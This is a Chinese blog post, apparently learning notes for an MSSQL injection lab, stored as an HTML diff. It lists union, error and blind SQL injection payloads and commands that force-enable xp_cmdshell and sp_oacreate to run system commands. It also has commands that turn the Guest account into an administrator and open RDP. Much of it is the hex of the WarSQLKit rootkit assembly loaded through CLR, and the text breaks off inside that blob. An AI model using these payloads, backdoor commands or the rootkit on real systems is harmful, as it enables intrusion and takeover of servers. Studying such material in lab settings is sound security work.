@@ -1,0 +1,294 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Sql注入--MSSQL/SqlServer | Khaz</title><meta name="author" content="Khaz"><meta name="copyright" content="Khaz"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="环境搭建 cn_windows_server_2008_r2_standard_enterprise_datacenter_and_web_with_sp1_x64_dvd_617598.iso 补丁：kb4474419 # 打了才能装vmtools服务器管理器添加角色IIS记得勾选.net开发IIS管理器添加网站，开启父路径  Sqlserver  2008 https:&#x2F;&#x2F;download.m">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sql注入--MSSQL&#x2F;SqlServer">
+<meta property="og:url" content="http://fgtbnc.github.io/2023/05/01/Sqlserver/index.html">
+<meta property="og:site_name" content="Khaz">
+<meta property="og:description" content="环境搭建 cn_windows_server_2008_r2_standard_enterprise_datacenter_and_web_with_sp1_x64_dvd_617598.iso 补丁：kb4474419 # 打了才能装vmtools服务器管理器添加角色IIS记得勾选.net开发IIS管理器添加网站，开启父路径  Sqlserver  2008 https:&#x2F;&#x2F;download.m">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fgtbnc.github.io/images/wallhaven-xlz933.jpg">
+<meta property="article:published_time" content="2023-05-01T11:52:40.000Z">
+<meta property="article:modified_time" content="2023-09-13T14:05:41.206Z">
+<meta property="article:author" content="Khaz">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fgtbnc.github.io/images/wallhaven-xlz933.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://fgtbnc.github.io/2023/05/01/Sqlserver/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":250},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#2d3035","position":"bottom-left"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Sql注入--MSSQL/SqlServer',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-09-13 22:05:41'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom/beauty.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://raw.githubusercontent.com/Khazing/typora-img/main/16870577801892f4a9c5aac2e9e5422a6ccd26db10dd88c73.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">57</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://fgtbnc.github.io/images/wallhaven-xlz933.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Khaz</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Sql注入--MSSQL/SqlServer</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-05-01T11:52:40.000Z" title="发表于 2023-05-01 19:52:40">2023-05-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-09-13T14:05:41.206Z" title="更新于 2023-09-13 22:05:41">2023-09-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>8分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Sql注入--MSSQL/SqlServer"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul>
+<li><p>cn_windows_server_2008_r2_standard_enterprise_datacenter_and_web_with_sp1_x64_dvd_617598.iso</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">补丁：kb4474419 # 打了才能装vmtools</span><br><span class="line"></span><br><span class="line">服务器管理器添加角色IIS</span><br><span class="line">记得勾选.net开发</span><br><span class="line">IIS管理器添加网站，开启父路径</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Sqlserver  2008</p>
+<p><a target="_blank" rel="noopener" href="https://download.microsoft.com/download/9/4/8/948966AB-52CA-40F1-8051-0216481065E6/SQLEXPR_x64_CHS.exe">https://download.microsoft.com/download/9/4/8/948966AB-52CA-40F1-8051-0216481065E6/SQLEXPR_x64_CHS.exe</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密码：SA123@</span><br><span class="line"></span><br><span class="line">C:\Windows\SysWOW64\SQLServerManager10</span><br><span class="line">开启TCP/IP</span><br></pre></td></tr></table></figure>
+
+<p>![image-20230516132937292](E:\typora img\image-20230516132937292.png)</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/Larryxi/MSSQL-SQLi-Labs">https://github.com/Larryxi/MSSQL-SQLi-Labs</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">创建数据库test</span><br><span class="line">修改数据库配置文件</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><h2 id="系统数据库"><a href="#系统数据库" class="headerlink" title="系统数据库"></a>系统数据库</h2><ul>
+<li><code>master</code> ：master数据库控制SQL Server的所有方面。这个数据库中包括所有的配置信息、用户登录信息、当前正在服务器中运行的过程的信息。</li>
+<li><code>model</code>：SQL Server为用户数据库提供的样板，新的用户数据库都以model数据库为基础</li>
+<li><code>msdb</code>   ：由 Enterprise Manager和Agent使用，记录着任务计划信息、事件处理信息、数据备份及恢复信息、警告及异常信息。</li>
+<li><code>tempdb</code>  ：它为临时表和其他临时工作提供了一个存储区。例如，排序时要用到tempdb数据库。数据被放进tempdb数据库，排完序后再把结果返回给用户。每次SQL Server重新启动，它都会清空tempdb数据库并重建。永远不要在tempdb数据库建立需要永久保存的表。</li>
+</ul>
+<h2 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h2><ul>
+<li><code>sa（SysAdmin）</code>权限：数据库操作，文件管理，命令执行，注册表读取等system。SQLServer数据库的最高权限</li>
+<li><code>db（Database_owner）</code>权限：文件管理，数据库操作等权限 users-administrators</li>
+<li><code>public</code>权限：数据库操作 guest-users</li>
+</ul>
+<h2 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">/**/</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="变量和函数"><a href="#变量和函数" class="headerlink" title="变量和函数"></a>变量和函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@@VERSION</span><br><span class="line">@@servername  -- 服务器名</span><br><span class="line">host_name() -- 主机名</span><br><span class="line"></span><br><span class="line">-- 判断站库分离</span><br><span class="line">host_name()==@@servername</span><br><span class="line"></span><br><span class="line">db_name()  -- 当前数据库</span><br><span class="line">db_name(num) -- 遍历其他数据库</span><br><span class="line"></span><br><span class="line">user</span><br><span class="line">user_name()</span><br><span class="line"></span><br><span class="line">is_srvrolemember(&#x27;sysadmin&#x27;)     -- 判断是否是SA权限</span><br><span class="line">is_member(&#x27;db_owner&#x27;)  	-- 判断是否是db_owner权限</span><br><span class="line">is_srvrolemember(&#x27;public&#x27;) -- 判断是否是public权限</span><br></pre></td></tr></table></figure>
+
+<h2 id="数据表"><a href="#数据表" class="headerlink" title="数据表"></a>数据表</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">master..sysdatabases -- 存放所有数据库</span><br><span class="line">master..sysobjects --  存放所有数据表</span><br><span class="line"></span><br><span class="line">-- 字段名为name</span><br><span class="line"></span><br><span class="line">select name from master..sysobjects where xtype=&#x27;U&#x27; -- 查询用户自建表</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[dbname].information_schema.columns  -- db的所有字段</span><br><span class="line"></span><br><span class="line">字段名table_name,column_name</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[dbname].information_schema.tables 	 -- db的所有表</span><br><span class="line"></span><br><span class="line">字段名table_name</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="语句"><a href="#语句" class="headerlink" title="语句"></a>语句</h2><table>
+<thead>
+<tr>
+<th align="center">SqlServer(mssql)</th>
+<th align="center">Mysql</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">select top 1 name from users</td>
+<td align="center">select  name from users limit 0,1</td>
+</tr>
+</tbody></table>
+<h1 id="注入手段"><a href="#注入手段" class="headerlink" title="注入手段"></a>注入手段</h1><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><blockquote>
+<p>利用显示或隐式转换来报错注入</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from admin where id =1 (select CAST(USER as int))</span><br><span class="line"></span><br><span class="line">select * from admin where id =1 (select convert(int,user))</span><br></pre></td></tr></table></figure>
+
+<p>![image-20230515211249595](E:\typora img\image-20230515211249595.png)</p>
+<h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><ul>
+<li><p>判断字段</p>
+<p>![image-20230515174430619](E:\typora img\image-20230515174430619.png)</p>
+</li>
+<li><p>查找回显</p>
+<p>![image-20230515174542376](E:\typora img\image-20230515174542376.png)</p>
+</li>
+<li><p>爆库</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,db_name(num)--</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>爆表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select top 1 1,2,name from [dbname]..sysobjects where xtype=&#x27;u&#x27; --</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select top 1 1,2,name from [dbname]..sysobjects where xtype=&#x27;u&#x27; and name!=&#x27;[第一条获得的表名]&#x27; --</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select top 1 1,2,name from [dbname]..sysobjects where xtype=&#x27;u&#x27; and name not in ([前面的表]) --</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>爆字段</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select  top 1  1,2, COLUMN_NAME from test.information_schema.columns where TABLE_NAME=&#x27;users&#x27; --</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select  top 1  1,2, COLUMN_NAME from test.information_schema.columns where TABLE_NAME=&#x27;users&#x27; and COLUMN_NAME and COLUMN_NAME!=&#x27;id&#x27; --</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select  top 1  1,2, COLUMN_NAME from test.information_schema.columns where TABLE_NAME=&#x27;users&#x27; and COLUMN_NAME not in (&#x27;id&#x27;,&#x27;username&#x27;) --</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>爆字段值</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select  top 1  1,2, COLUMN_NAME from &#x27;users&#x27; --</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select  top 1 1,2,username from users where username!=&#x27;Dumb&#x27;--</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select  top 1 1,2,username from users where username not in (&#x27;Dumb&#x27;,&#x27;Angelina&#x27;)--</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>默认开启</p>
+<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(xxx) waitfor delay &#x27;0:0:2&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h1><h2 id="绝对路径🔍"><a href="#绝对路径🔍" class="headerlink" title="绝对路径🔍"></a>绝对路径🔍</h2><blockquote>
+<p><code>xp_dirtree</code> 是一个存储过程（stored procedure），它是 Microsoft SQL Server 数据库引擎提供的一个内置过程。该过程可用于执行文件系统目录树扫描操作。</p>
+<p>使用 <code>xp_dirtree</code> 存储过程，可以指定一个文件路径，然后执行递归扫描该路径下的所有文件和文件夹，并将结果以表格形式返回给用户</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">execute master..xp_dirtree &#x27;c:&#x27; //列出所有c:\文件和目录,子目录 </span><br><span class="line">execute master..xp_dirtree &#x27;c:&#x27;,1 //只列c:\文件夹 </span><br><span class="line">execute master..xp_dirtree &#x27;c:&#x27;,1,1 //列c:\文件夹加文件 </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE tmp (dir varchar(8000),num int,num1 int);</span><br><span class="line"></span><br><span class="line">insert into tmp(dir,num,num1) execute master..xp_dirtree &#x27;c:&#x27;,1,1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE cmdtmp (dir varchar(8000));</span><br><span class="line"></span><br><span class="line">insert into cmdtmp(dir) exec master..xp_cmdshell &#x27;for /r c:\ %i in (1*.aspx) do @echo %i&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../../../blog/source/images/image-20230515213216038-1694613900373.png" alt="image-20230515213216038"></p>
+<h2 id="SA权限"><a href="#SA权限" class="headerlink" title="SA权限"></a>SA权限</h2><h3 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h3><ul>
+<li><p>是否开启</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*) FROM master..sysobjects Where xtype = &#x27;X&#x27; AND name = &#x27;xp_cmdshell&#x27; </span><br><span class="line"></span><br><span class="line">返回值为1 → 开启</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>强制开启</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 将该选项的值设置为1</span><br><span class="line">execute(&#x27;sp_configure &quot;show advanced options&quot;,1&#x27;)  </span><br><span class="line">-- 保存设置</span><br><span class="line">execute(&#x27;reconfigure&#x27;) </span><br><span class="line">-- 将xp_cmdshell的值设置为1</span><br><span class="line">execute(&#x27;sp_configure &quot;xp_cmdshell&quot;, 1&#x27;) </span><br><span class="line">-- 保存设置</span><br><span class="line">execute(&#x27;reconfigure&#x27;)                             </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>恢复被删除的<code>xp_cmdshell</code></p>
+<p>下载：<a target="_blank" rel="noopener" href="https://cn.dll-files.com/xplog70.dll.html">https://cn.dll-files.com/xplog70.dll.html</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Exec master.dbo.sp_addextendedproc &#x27;xp_cmdshell&#x27;,&#x27;D:\\xplog70.dll&#x27;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>命令执行–有回显（返回命令结果）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">execute(&#x27;xp_cmdshell &quot;whoami&quot;&#x27;) </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获得主机权限</p>
+<blockquote>
+<p>版本问题？？</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec xp_cmdshell &#x27;net user Guest 123456&#x27;              --给guest用户设置密码</span><br><span class="line">exec xp_cmdshell &#x27;net user Guest /active:yes&#x27;         --激活guest用户</span><br><span class="line">exec xp_cmdshell &#x27;net localgroup administrators Guest /add&#x27;  --将guest用户添加到administrators用户组</span><br><span class="line">exec xp_cmdshell &#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#x27;        --开启3389端口</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="sp-oacreate"><a href="#sp-oacreate" class="headerlink" title="sp_oacreate"></a>sp_oacreate</h3><ul>
+<li><p>是否开启</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*) from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;SP_OACREATE&#x27;</span><br><span class="line"></span><br><span class="line">返回值为1 → 开启</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>强制开启</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;  </span><br><span class="line">RECONFIGURE WITH OVERRIDE;  </span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;  </span><br><span class="line">RECONFIGURE WITH OVERRIDE;  </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>命令执行–无回显（不返回命令结果）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c whoami &gt; e:\\test2.txt&#x27;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="CLR功能"><a href="#CLR功能" class="headerlink" title="CLR功能"></a>CLR功能</h3><blockquote>
+<p>CLR（公共语言运行时）提供了 .NET Framework 的代码执行环境，可以通过 .NET Framework 来编写存储过程、触发器等功能 。简单说，通过 CLR 能够在 <a target="_blank" rel="noopener" href="https://cloud.tencent.com/product/sqlserver?from=20065&from_column=20065">SQLServer</a> 中注册一套程序集，实现执行任意的 .NET 代码。既然可以执行代码，此时就可以实现很多功能。</p>
+</blockquote>
+<p>使用：<a target="_blank" rel="noopener" href="https://github.com/mindspoof/MSSQL-Fileless-Rootkit-WarSQLKit">https://github.com/mindspoof/MSSQL-Fileless-Rootkit-WarSQLKit</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--启用MSSQL CLR功能</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">Exec sp_configure &#x27;clr enabled&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"> </span><br><span class="line">--为了导入了不安全的程序集，我们还需要将数据库标记为安全。</span><br><span class="line">ALTER DATABASE [master] SET TRUSTWORTHY ON;</span><br><span class="line"> </span><br><span class="line">--导入程序集，单独执行</span><br><span class="line">CREATE ASSEMBLY [WarSQLKit] AUTHORIZATION [dbo] FROM 0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000504500004c0103006643f55f0000000000000000e00022200b013000000e00000006000000000000022d0000002000000040000000000010002000000002000004000000000000000400000000000000008000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000b02c00004f00000000400000b803000000000000000000000000000000000000006000000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002e74657874000000080d000000200000000e000000020000000000000000000000000000200000602e72737263000000b8030000004000000004000000100000000000000000000000000000400000402e72656c6f6300000c0000000060000000020000001400000000000000000000000000004000004200000000000000000000000000000000e42c00000000000048000000020005005c220000540a00000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000be280e00000a72010000706f0f00000a280e00000a7243000070725300007002281000000a28020000066f0f00000a2a1b300600a40100000100001173040000060a731100000a0b076f1200000a026f1300000a03281400000a2d0c076f1200000a036f1500000a076f1200000a176f1600000a076f1200000a176f1700000a076f1200000a166f1800000a076f1200000a176f1900000a076f1200000a176f1a00000a06731b00000a7d010000040706fe0605000006731c00000a6f1d00000a140c076f1e00000a26076f1f00000a076f2000000a6f2100000a0c076f2200000ade390d280e00000a1b8d160000012516725d000070a2251702a2251803a225197291000070a2251a096f2300000aa2282400000a6f0f00000ade00076f2500000a2d1a280e00000a067b010000046f2600000a6f0f00000a3895000000731b00000a130408281400000a2d091104086f2700000a26067b010000046f2800000a2c20110472970000706f2700000a261104067b010000046f2600000a6f2700000a26280e00000a1c8d16000001251602a2251703a2251872af000070a22519076f2500000a13051205282900000aa2251a7291000070a2251b1104252d0426142b056f2600000aa2282400000a6f0f00000a067b010000046f2600000a2a011000000000870021a80039100000011e02282a00000a2a4e027b01000004046f2b00000a6f2700000a262a42534a4201000100000000000c00000076322e302e35303732370000000005006c00000038030000237e0000a4030000a804000023537472696e6773000000004c080000e80000002355530034090000100000002347554944000000440900001001000023426c6f620000000000000002000001571502000902000000fa013300160000010000001c000000030000000100000005000000050000002b0000000d000000010000000100000003000000010000000000b1020100000000000600ed01ae0306005a02ae03060038019b030f00ce03000006004c01cd020600d001cd020600b101cd0206004102cd0206000d02cd0206002602cd0206007901cd0206009401cd0206003004c6020a0063014e030e0009049b030600df02c602060020036e0406001d01ae030e00ee039b030a007a044e030a0015014e0306008e02c6020e00f7029b030e00c4009b030e0035039b0306000803360006001503360006002700c602000000002d00000000000100010001001000dd030000350001000100030110000100000035000100040006006404740050200000000096005e007800010080200000000096008b001a00020040220000000086189503060004004022000000008618950306000400482200000000830016007d000400000001007d0000000100e400000002001f04000001002e03000002000404090095030100110095030600190095030a00290095031000310095031000390095031000410095031000490095031000510095031000590095031000610095031000710095030600910095030600a1000c011500a90096001000b10029041a007900950306007900e9022d00b900d7001000b10098043200b90011041000b90085043700b900b4003c00b90078023700b9007b033700b90049043700890095030600c90095034200790066004800790043044e007900ed000600790069035200d900810057007900370406008100a8005700b10029045b0079009b00610069008c025700890001016500890095026100e1008c02570069009503060099004c005700200063000b012e000b0084002e0013008d002e001b00ac002e002300b5002e002b00cb002e003300cb002e003b00cb002e004300d1002e004b00e1002e005300cb002e005b00fe0063006b000b012000048000000100000000000000000000000000a00200000200000000000000000000006b005500000000000200000000000000000000006b004000000000000200000000000000000000006b00c60200000000030002000000003c3e635f5f446973706c6179436c617373315f30003c52756e436f6d6d616e643e625f5f3000496e743332003c4d6f64756c653e0053797374656d2e494f0053797374656d2e44617461006765745f44617461006d73636f726c696200436d6445786563006164645f4f757470757444617461526563656976656400636d640052656164546f456e640052756e436f6d6d616e640053656e64006765745f45786974436f6465006765745f4d657373616765007365745f57696e646f775374796c650050726f6365737357696e646f775374796c65007365745f46696c654e616d650066696c656e616d6500426567696e4f7574707574526561644c696e6500417070656e644c696e65006765745f506970650053716c5069706500436f6d70696c657247656e6572617465644174747269627574650044656275676761626c6541747472696275746500417373656d626c795469746c654174747269627574650053716c50726f63656475726541747472696275746500417373656d626c7954726164656d61726b41747472696275746500417373656d626c7946696c6556657273696f6e41747472696275746500417373656d626c79436f6e66696775726174696f6e41747472696275746500417373656d626c794465736372697074696f6e41747472696275746500436f6d70696c6174696f6e52656c61786174696f6e7341747472696275746500417373656d626c7950726f6475637441747472696275746500417373656d626c79436f7079726967687441747472696275746500417373656d626c79436f6d70616e794174747269627574650052756e74696d65436f6d7061746962696c697479417474726962757465007365745f5573655368656c6c4578656375746500546f537472696e67006765745f4c656e6774680057617253514c4b69744d696e696d616c0057617253514c4b69744d696e696d616c2e646c6c0053797374656d0053797374656d2e5265666c656374696f6e00457863657074696f6e006765745f5374617274496e666f0050726f636573735374617274496e666f0053747265616d526561646572005465787452656164657200537472696e674275696c6465720073656e646572004461746152656365697665644576656e7448616e646c6572004d6963726f736f66742e53716c5365727665722e536572766572006765745f5374616e646172644572726f72007365745f52656469726563745374616e646172644572726f72002e63746f720053797374656d2e446961676e6f73746963730053797374656d2e52756e74696d652e436f6d70696c6572536572766963657300446562756767696e674d6f6465730053746f72656450726f63656475726573004461746152656365697665644576656e744172677300617267730050726f63657373007365745f417267756d656e747300617267756d656e747300436f6e636174004f626a6563740057616974466f72457869740053